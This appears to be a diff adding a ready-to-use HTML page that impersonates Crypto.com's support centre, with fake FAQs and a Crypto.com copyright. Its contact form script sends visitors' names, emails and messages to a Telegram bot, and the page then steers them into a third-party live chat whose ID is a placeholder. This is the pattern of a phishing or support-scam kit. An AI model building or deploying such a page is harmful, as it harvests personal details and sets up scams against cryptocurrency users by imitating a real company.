@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Crypto.com Support</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f8f9fb;
+    }
+
+    nav {
+      background-color: #001f3f;
+    }
+
+    nav a.navbar-brand,
+    nav .nav-link {
+      color: white !important;
+    }
+
+    .hero {
+      background: linear-gradient(120deg, #002b5c, #001f3f);
+      color: white;
+      padding: 60px 20px;
+      text-align: center;
+    }
+
+    .hero h1 {
+      font-size: 2.5rem;
+    }
+
+    .quick-help {
+      padding: 40px 20px;
+    }
+
+    .quick-help .card {
+      box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+      transition: transform 0.2s ease;
+    }
+
+    .quick-help .card:hover {
+      transform: translateY(-5px);
+    }
+
+    .faq-section, .contact-section {
+      padding: 40px 20px;
+    }
+
+    .footer {
+      background-color: #001f3f;
+      color: white;
+      padding: 20px;
+      text-align: center;
+    }
+
+    .btn-primary {
+      background-color: #0056b3;
+      border: none;
+    }
+
+    .btn-primary:hover {
+      background-color: #004494;
+    }
+  </style>
+</head>
+<body>
+
+<!-- Navbar -->
+<nav class="navbar navbar-expand-lg">
+  <div class="container">
+    <a class="navbar-brand" href="#">Crypto.com Support</a>
+    <button class="navbar-toggler bg-white" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+      <span class="navbar-toggler-icon text-white"><i class="fas fa-bars"></i></span>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarNav">
+      <ul class="navbar-nav ms-auto">
+        <li class="nav-item"><a class="nav-link" href="#quick-help">Help</a></li>
+        <li class="nav-item"><a class="nav-link" href="#faqs">FAQs</a></li>
+        <li class="nav-item"><a class="nav-link" href="#contact">Contact</a></li>
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Hero -->
+<section class="hero">
+  <div class="container">
+    <h1>Welcome to Crypto.com Support</h1>
+    <p class="mt-3">Get help fast. Find answers, report issues, or contact support.</p>
+  </div>
+</section>
+
+<!-- Quick Help -->
+<section class="quick-help" id="quick-help">
+  <div class="container">
+    <h2 class="text-center mb-4">Quick Help Topics</h2>
+    <div class="row g-4">
+      <div class="col-md-4">
+        <div class="card p-4">
+          <i class="fas fa-lock fa-2x text-primary mb-3"></i>
+          <h5>Reset Password</h5>
+          <p>Forgot your password? Learn how to reset it securely.</p>
+        </div>
+      </div>
+      <div class="col-md-4">
+        <div class="card p-4">
+          <i class="fas fa-credit-card fa-2x text-primary mb-3"></i>
+          <h5>Card Not Working</h5>
+          <p>Trouble with your Crypto.com Visa Card? Check possible issues.</p>
+        </div>
+      </div>
+      <div class="col-md-4">
+        <div class="card p-4">
+          <i class="fas fa-user-shield fa-2x text-primary mb-3"></i>
+          <h5>Report Fraud</h5>
+          <p>Suspicious activity? Report immediately to stay protected.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- FAQ Section -->
+<section class="faq-section" id="faqs">
+  <div class="container">
+    <h2 class="text-center mb-4">Frequently Asked Questions</h2>
+    <div class="accordion" id="faqAccordion">
+      <div class="accordion-item">
+        <h2 class="accordion-header" id="headingOne">
+          <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#faq1">
+            How do I reset my Crypto.com account password?
+          </button>
+        </h2>
+        <div id="faq1" class="accordion-collapse collapse show">
+          <div class="accordion-body">
+            Go to the login page and click "Forgot Password" to start recovery.
+          </div>
+        </div>
+      </div>
+      <div class="accordion-item">
+        <h2 class="accordion-header">
+          <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#faq2">
+            Why is my withdrawal pending?
+          </button>
+        </h2>
+        <div id="faq2" class="accordion-collapse collapse">
+          <div class="accordion-body">
+            Withdrawals are reviewed and may take 24 hours for security checks.
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Contact Form -->
+<section class="contact-section" id="contact">
+  <div class="container">
+    <h2 class="text-center mb-4">Contact Support</h2>
+    <div class="row justify-content-center">
+      <div class="col-md-6">
+        <form id="contactForm" class="bg-white p-4 rounded shadow">
+          <div class="mb-3">
+            <label class="form-label">Your Name</label>
+            <input type="text" class="form-control" id="name" required />
+          </div>
+          <div class="mb-3">
+            <label class="form-label">Your Email</label>
+            <input type="email" class="form-control" id="email" required />
+          </div>
+          <div class="mb-3">
+            <label class="form-label">Your Message</label>
+            <textarea class="form-control" id="message" rows="4" required></textarea>
+          </div>
+          <button type="submit" class="btn btn-primary w-100">Send</button>
+        </form>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Footer -->
+<div class="footer">
+  &copy; 2025 Crypto.com — Secure Help Center
+</div>
+
+<!-- Tawk.to Live Chat -->
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/YOUR_TAWKTO_ID/default';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
+
+<!-- Telegram Form Script -->
+<script>
+document.getElementById('contactForm').addEventListener('submit', function(e) {
+  e.preventDefault();
+  const name = document.getElementById("name").value;
+  const email = document.getElementById("email").value;
+  const message = document.getElementById("message").value;
+  const text = `📩 New Support Message:\n\n👤 Name: ${name}\n📧 Email: ${email}\n📝 Message: ${message}`;
+  const botToken = "YOUR_BOT_TOKEN_HERE"; // REPLACE
+  const chatId = "YOUR_CHAT_ID_HERE";     // REPLACE
+
+  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    method: "POST",
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: chatId, text: text })
+  }).then(res => {
+    if (res.ok) {
+      alert("✅ Your message has been received. Please chat with our live support below for quicker help.");
+      document.getElementById("contactForm").reset();
+    } else {
+      alert("❌ Failed to send. Check bot token or chat ID.");
+    }
+  });
+});
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
